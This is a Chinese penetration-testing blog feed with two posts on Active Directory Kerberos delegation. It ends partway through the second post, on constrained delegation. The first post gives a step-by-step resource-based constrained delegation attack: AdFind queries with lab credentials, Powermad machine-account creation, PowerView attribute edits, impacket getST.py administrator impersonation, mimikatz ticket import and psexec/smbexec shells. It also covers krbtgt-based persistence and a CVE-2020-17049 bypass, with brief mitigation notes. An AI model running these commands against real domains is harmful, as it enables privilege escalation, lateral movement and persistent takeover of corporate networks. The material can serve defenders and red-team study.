  <entry>
    <title>基于资源的约束委派</title>
    <link href="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是基于资源的约束委派"><a href="#什么是基于资源的约束委派" class="headerlink" title="什么是基于资源的约束委派"></a>什么是基于资源的约束委派</h2><p>为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p><p>上面”基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。</p><p>与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p><h2 id="基于资源的约束性委派的优势"><a href="#基于资源的约束性委派的优势" class="headerlink" title="基于资源的约束性委派的优势"></a>基于资源的约束性委派的优势</h2><ul><li>委派的权限授予给了拥有资源的后端，而不再是前端</li><li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</li><li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。</li></ul><h2 id="约束性委派和基于资源的约束性委派配置的差别"><a href="#约束性委派和基于资源的约束性委派配置的差别" class="headerlink" title="约束性委派和基于资源的约束性委派配置的差别"></a>约束性委派和基于资源的约束性委派配置的差别</h2><ul><li>传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</li><li>而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</li></ul><h2 id="三个重要的域属性合集"><a href="#三个重要的域属性合集" class="headerlink" title="三个重要的域属性合集"></a>三个重要的域属性合集</h2><h3 id="关于ms-DS-CreatorSID"><a href="#关于ms-DS-CreatorSID" class="headerlink" title="关于ms-DS-CreatorSID"></a>关于ms-DS-CreatorSID</h3><p>一个场景，比如你通过ske这个域账户来登录当前的ttkq的机器中，然后将其加入到一个指定的域，然后账号密码用的就是ske这个账户密码，那么这个ttkq机器中的<code>ms-DS-CreatorSID</code>保存的就是当前ske用户的SID</p><h3 id="关于msDS-AllowedToActOnBehalfOfOtherIdentity"><a href="#关于msDS-AllowedToActOnBehalfOfOtherIdentity" class="headerlink" title="关于msDS-AllowedToActOnBehalfOfOtherIdentity"></a>关于msDS-AllowedToActOnBehalfOfOtherIdentity</h3><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218014124021.png" alt="image-20220218014124021"></p><p>上面图中字段的内容为</p><p><code>D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)</code>，</p><p>这个值是基于SDDL的语法的，自己笔记中有记录过，这里的话意思就是在SID为</p><p><code>S-1-5-21-4223269421-3390898629-3395902804-1119</code></p><p>上配置了基于资源的约束委派，也就是</p><p><code>S-1-5-21-4223269421-3390898629-3395902804-1119</code></p><p>对应的用户/机器对当前WIN-SKE-PC具有委派资源的权力</p><h3 id="ms-DS-MachineAccountQuota"><a href="#ms-DS-MachineAccountQuota" class="headerlink" title="ms-DS-MachineAccountQuota"></a>ms-DS-MachineAccountQuota</h3><p>这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户</p><p>为什么需要这个呢？这里还需要引出一个S4U2Self其中的一个知识点</p><p>因为基于资源的约束委派中需要用到S4U2Self和S4U2Proxy，又因为S4U2Self只适用于具有SPN的账户，恰好的是在域中有一个属性MachineAccountQuota，所以就需要通过MachineAccountQuota来创建一个SPN的账户来进行委派配合<br>，而计算机账户默认是注册RestrictedKrbHost/domain和HOST/domain这两个SPN的</p><p>知识点：</p><p>1、传统的约束委派S4U2Self返回的票据一定是可转发的（Forwardable标记），如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。</p><p>2、基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p><h2 id="基于资源的约束委派攻击本地提权"><a href="#基于资源的约束委派攻击本地提权" class="headerlink" title="基于资源的约束委派攻击本地提权"></a>基于资源的约束委派攻击本地提权</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li>在很多企业内部，都会有一个专门将机器加入域的账号。如果我们能够拿到该账号的权限，则我们能够拿到通过该账号加入域的所有机 器的system权限。 </li><li>如果我们拿到了Account Operators组内用户权限的话，则我们可以拿到除域控外所有机器的system权限。</li></ul><p>攻击者可以查询域内计算机的 mS-DS-CreatorSID ，这个值代表的是将计算机加⼊到域内的⽤户，它是具有修改 msDS-AllowedToActOnBehalfOfOtherIdentity 的权限的，如果我们可以拿到那个⽤户的凭据，就可以控制那 个⽤户添加到域内的所有的电脑。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>⾸先添加机器账户，修改 msDS-AllowedToActOnBehalfOfOtherIdentity 值为机器账户的 sid ，然后以机器 账户的身份伪造成 administrator 申请⼀张访问此机器账户机器的 ticket (类似于⽩银票据)，因为机器账户没 有配置约束性委派，所以这张票据是不可转发的，但是在基于资源的约束性委派中，票据是否可以转发不重要，对 之后对 s4u2proxy 不影响，最后利⽤这张 ticket 去申请访问修改了 msDSAllowedToActOnBehalfOfOtherIdentity 属性的机器。</p><h3 id="攻击利⽤"><a href="#攻击利⽤" class="headerlink" title="攻击利⽤"></a>攻击利⽤</h3><p>这里用的是渗透攻击红队的pdf</p><p>saulgoodman.cn 域环境：</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015226680.png" alt="image-20220218015226680"></p><p>这里其实是在win7里面操作的</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015417945.png" alt="image-20220218015417945"></p><p>其中 saulgoodman 这个域⽤户就是加域⽤户 ，可以发现saulgoodman 不是 win7 机器的本地管理员。，就可以通过 saulgoodman 域⽤户提权到 adminsitrator</p><p>在 saulgoodman.cn 域中，saulgoodman 域⽤户负责将 web-2008 的机器或者 Win7 机器加⼊到 saulgoodman.cn 域⾥，那么当我们拿下 saulgoodman 这个域⽤户的权限后，就可以拿下域内 web-2008 的域机 器和 win7的域机器。</p><p>假设我们已经获取到加域机器的 saulgoodman 的账户密码：</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015547462.png" alt="image-20220218015547462"></p><p>1、通过 ADfind 查询每个域机器是由哪个域⽤户添加进域的，通过 mS-DS-CreatorSID 查看域⽤户的 sid：</p><p>命令：AdFind.exe -h 10.0.0.12 -u saulgoodman -up admin!@#45 -b “DC=saulgoodman,DC=cn” -f “objectClass=computer” mS-DS-CreatorSID</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015707643.png" alt="image-20220218015707643"></p><p>得到 win7 机器是 sid： S-1-5-21-3258976832-1609833424-2410015844-1108 的⽤户加⼊到域的。</p><p>那么问题来了，我们怎么知道 S-1-5-21-3258976832-1609833424-2410015844-1108 是那个域⽤户的 sid 呢？ 2、若是想要查询每个域⽤户的 sid 就可以使⽤ sid2user 来帮助我们完成：（需要把 - 去掉）</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218015800924.png" alt="image-20220218015800924"></p><p>这个时候就知道了 sid： S-1-5-21-3258976832-1609833424-2410015844-1108 是域⽤户 saulgoodman 。</p><p>这些操作 是对前面如何确定saulgoodman  具有修改msDS-AllowedToActOnBehalfOfOtherIdentity权限的过程</p><p>然后进行下面的操作</p><p><strong>我们需要添加⼀个机器⽤户，因为需要⽤机器⽤户去申请票据，本身的 win7 机器账户我们不知道他的密码所以⽆ 法申请票据，所以我们需要添加⼀个机器⽤户，⽤来帮助我们申请票据。</strong></p><p>3、然后利⽤ powermad 添加机器账户： 下载地址：<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><p>/# 添加⽤户 goodman 密码 123456 </p><p>powershell </p><p>Set-ExecutionPolicy Bypass -Scope Process </p><p>. ./Powermad.ps1 </p><p>New-MachineAccount -MachineAccount goodman -Password $(ConvertTo-SecureString “123456” -AsPlainText -Force) </p><p>验证是否添加成功 net group “domain computers” /domain</p><p>net group “domain computers” /domain</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020123600.png" alt="image-20220218020123600"></p><p>此时就有了⼀个域机器账户 goodman:</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020157535.png" alt="image-20220218020157535"></p><p>4、获取 goodman 的 object Sid：得到了 sid 为： S-1-5-21-3258976832-1609833424-2410015844-1116 。 下⾯是修改 win7 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值，使⽤ Powerview ：<a href="https://git/">https://git</a> hub.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p><p>这里获取goodman 新建的机器用户的sid  这里pdf是从域控上直接查看的  也可以用其他的方式来获取goodman的sid</p><p>5、配置 goodman 到 win7 的基于资源的约束委派:</p><p>powershell </p><p>Set-ExecutionPolicy Bypass -Scope Process </p><p>. ./powerview.ps1 </p><p>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList “O:BAD: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3258976832-1609833424-2410015844-1116)” $SDBytes = New-Object byte[] ($SD.BinaryLength) </p><p>$SD.GetBinaryForm($SDBytes, 0) </p><p>Get-DomainComputer win7| Set-DomainObject -Set @{‘msdsallowedtoactonbehalfofotheridentity’=$SDBytes} -Verbose</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020608083.png" alt="image-20220218020608083"></p><p>验证是否成功添加：</p><p>Get-DomainComputer win7 -Properties msds-allowedtoactonbehalfofotheridentity</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020624672.png" alt="image-20220218020624672"></p><p>若想清除 msds-allowedtoactonbehalfofotheridentity 属性的值，可⽤如下命令：</p><p>Set-DomainObject win7 -Clear ‘msds-allowedtoactonbehalfofotheridentity’ -Verbose</p><p>6、使⽤ impacket的 getST.py ⽣成票据（建议使⽤ socks5），会在当前⽬录下⽣成 administrator.ccache ⽂ 件：</p><blockquote><p>python getST.py -dc-ip 10.0.0.12 saulgoodman.cn/goodman/$:123456 -spn cifs/win7.saulgoodman.cn -impersonate administrator</p></blockquote><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020732614.png" alt="image-20220218020732614"></p><p>7、之后使⽤ mimikatz 导⼊票据：</p><p>kerberos::ptc administrator.ccache</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218020756855.png" alt="image-20220218020756855"></p><p>此时就能成功访问 Win7 了，这就是基于资源的约束委派攻击利⽤的整个流程</p><p>如果想弹shell 也可以这样</p><p>通过impacket工具包中的getST.py来进行利用，执行如下命令：</p><blockquote><p>python getST.py -dc-ip 192.168.4.11 hengge.com/ttkq$:admin@123 -spn cifs/WIN-SKE-PC -impersonate administrator</p></blockquote><p>创建票据的环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">KRB5CCNAME</span>=administrator.ccache<br></code></pre></td></tr></table></figure><p>然后继续导入ST票据，通过psexec来进行连接测试</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> psexec.<span class="hljs-keyword">py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">4.11</span> hengge.<span class="hljs-keyword">com</span>/administrator@WIN-SKE-PC -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218021017465.png" alt="image-20220218021017465"></p><p>system权限</p><p>这里smbclient也是一样的用法</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> smbclient.<span class="hljs-keyword">py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">4.11</span> hengge.<span class="hljs-keyword">com</span>/administrator@WIN-SKE-PC -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">no</span>-pass<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220218021101717.png" alt="image-20220218021101717"></p><h2 id="利用基于资源的约束委派打造变种黄金票据-权限维持"><a href="#利用基于资源的约束委派打造变种黄金票据-权限维持" class="headerlink" title="利用基于资源的约束委派打造变种黄金票据(权限维持)"></a>利用基于资源的约束委派打造变种黄金票据(权限维持)</h2><p>如果这里我们假设服务B为krbtgt，服务A为我们控制的一个账号。配置服务A到服务B的基于资源的约束性委派， 那么我们控制的账户就可以获取KDC（Key Distribution Centre）服务的ST服务票据(也就是TGT认购权证)。于是我 们就可以伪造任何权限用户的TGT认购权证，来打造一个变种的黄金票据了！</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140351200.png" alt="image-20220219140351200"></p><p>首先在我们控制的普通域用户中创建一个机器账户：service5$ 密码为：root</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140509933.png" alt="image-20220219140509933"></p><p>然后来到域控执行</p><p>配置krbtgt到service5$的基于资源的约束性委派 </p><blockquote><p>shell powershell Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount service5$ </p></blockquote><blockquote><p>shell powershell Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</p></blockquote><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140719541.png" alt="image-20220219140719541"></p><p>然后切换到物理机  这里是不需要在域控的</p><p>sudo python3 getST.py -dc-ip 10.211.55.4 -spn krbtgt -impersonate administrator xie.com/service3/$:root </p><p>export KRB5CCNAME=administrator.ccache </p><p>python3 smbexec.py -no-pass -k <a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#105;&#115;&#x74;&#x72;&#x61;&#116;&#x6f;&#x72;&#x40;&#65;&#x44;&#x30;&#x31;&#x2e;&#120;&#105;&#x65;&#46;&#99;&#111;&#x6d;">&#x61;&#100;&#x6d;&#x69;&#110;&#105;&#115;&#x74;&#x72;&#x61;&#116;&#x6f;&#x72;&#x40;&#65;&#x44;&#x30;&#x31;&#x2e;&#120;&#105;&#x65;&#46;&#99;&#111;&#x6d;</a> -dc-ip 10.211.55.4</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219140854724.png" alt="image-20220219140854724"></p><p>直接获取了域控的权限</p><p>域控改密码了也没事</p><h2 id="域委派攻击防范措施"><a href="#域委派攻击防范措施" class="headerlink" title="域委派攻击防范措施"></a>域委派攻击防范措施</h2><ul><li>高权限的用户，设置不能被委派 </li><li>主机账号需设置委派时，只能设置为约束性委派； </li><li>Windows 2012 R2及更高的系统建立了受保护的用户组Protected Users，组内用户不允许被委派，这是有效的手段。受保护的用户组，</li></ul><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219141610045.png" alt="image-20220219141610045"></p><p>设置为不可委派 </p><p>设置之后  就不能获取票据了</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142445276.png" alt="image-20220219142445276"></p><p>但是可以绕过</p><p>利用CVE 2020 17049</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142535595.png" alt="image-20220219142535595"></p><p>设置之后的流程是这样</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142619886.png" alt="image-20220219142619886"></p><p>所以不会返回票据  </p><p>但是绕过这个  是通过逻辑漏洞 </p><p>我们主动修改forwardable 为1</p><p>然后就进入右边的流程  又因为配置了委派 所以能返回票据</p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142742572.png" alt="image-20220219142742572"></p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142755835.png" alt="image-20220219142755835"></p><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142808724.png" alt="image-20220219142808724"></p><p>设置之后 就能返回票据了</p><h2 id="漏洞预防和修复"><a href="#漏洞预防和修复" class="headerlink" title="漏洞预防和修复"></a>漏洞预防和修复</h2><p><img src="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220219142950422.png" alt="image-20220219142950422"></p><p>参考：渗透攻击红队</p><p>谢公子</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>约束委派</title>
    <link href="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，如下所示</p><p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p><p>这里就引入了两个新的概念</p><h2 id="S4U2Self和S4U2Proxy"><a href="#S4U2Self和S4U2Proxy" class="headerlink" title="S4U2Self和S4U2Proxy"></a>S4U2Self和S4U2Proxy</h2><h3 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h3><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p><h3 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h3><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>用户请求一个约束委派的服务流程图如下：</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215104201928.png" alt="image-20220215104201928"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>.用户向Service1发送请求<br><br><span class="hljs-number">2</span>.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT1票据（Forwardable标记），然后通过S4U2self扩展模拟用户向KDC请求<span class="hljs-built_in">ST</span>。<br><br><span class="hljs-number">3.</span>KDC这时返回给Service1一个用于用户验证Service1的<span class="hljs-built_in">ST</span>（我们称为<span class="hljs-built_in">ST1</span>）（Forwardable标记），并且Service1用这个<span class="hljs-built_in">ST1</span>完成和用户的验证过程。<br><br><span class="hljs-number">4.</span>Service1在步骤<span class="hljs-number">3</span>使用模拟用户申请KDC所获得的<span class="hljs-built_in">ST1</span>票据与User进行验证，然后响应用户的请求。<br><br>注:这个过程其实Service1是获得了用户的<span class="hljs-built_in">ST1</span>和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。<br><br><span class="hljs-number">5</span>.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。<br><br>A。Service1已经通过验证，并且有一个有效的TGT。<br><br>B。Service1有从用户到Service1的forwardableST（可转发<span class="hljs-built_in">ST</span>），此处我认为，根据流程来看，可转发<span class="hljs-built_in">ST1</span>其实就是<span class="hljs-built_in">ST1</span>，用于(<span class="hljs-number">6</span>)的验证<br><br><span class="hljs-number">6.</span>Service1代表用户向Service2请求一个用于认证Service2的<span class="hljs-built_in">ST</span>(称之为<span class="hljs-built_in">ST2</span>)。用户在<span class="hljs-built_in">ST1</span>中通过cname (client name) 和crealm(client name)进行标示。<br><br><span class="hljs-number">7.</span>KDC接收到(<span class="hljs-number">6</span>)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回<span class="hljs-built_in">ST2</span>给service1,不过这个<span class="hljs-built_in">ST2</span>中的cname crealm标示的是用户而不是service1。<br><br><span class="hljs-number">8.</span>service1代表用户使用<span class="hljs-built_in">ST2</span>请求访问Service2<br><br><span class="hljs-number">9.</span>Service2响应Service1的请求<br><br><span class="hljs-number">10.</span>Service1将Service2的响应转发给User。<br></code></pre></td></tr></table></figure><p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p><p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p><p>查询非约束委派主要是通过搜索userAccountControl属性包含<code>ADS_UF_TRUSTED_FOR_DELEGATION</code>的主机或账户</p><p>非约束委派的查询：</p><p>通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。</p><p>查询域中配置非约束委派的账户：<br><code>Get-NetUser -Unconstrained -Domain rootkit.org</code></p><p>查询域中配置非约束委派的主机：<br><code>Get-NetComputer -Unconstrained -Domain rootkit.org</code></p><p>查询约束委派则通过搜索userAccountControl属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>的主机或用户</p><p>约束委派的查询：</p><p>查询域中配置约束委派的账户：<br><code>Get-DomainUser -TrustedToAuth -Domain rootkit.org</code></p><p>查询域中配置约束委派的主机:<br><code>Get-DomainComputer -TrustedToAuth -Domain rootkit.org</code></p><h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p> 域控机为域用户配置SPN，用于域用户配置约束委派</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setspn</span> -U -A SQL/test win<span class="hljs-number">2016</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113044390.png" alt="image-20220215113044390"></p><p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p><p>为win2016用户配置约束委派，做win2 019机器的cifs服务的委派</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113056606.png" alt="image-20220215113056606"></p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113103146.png" alt="image-20220215113103146"></p><p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p><h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p><h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AdFind</span>.</span></span>exe -b <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113117420.png" alt="image-20220215113117420"></p><p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p><h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AdFind</span>.</span></span>exe -b <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></code></pre></td></tr></table></figure><p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p><h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" 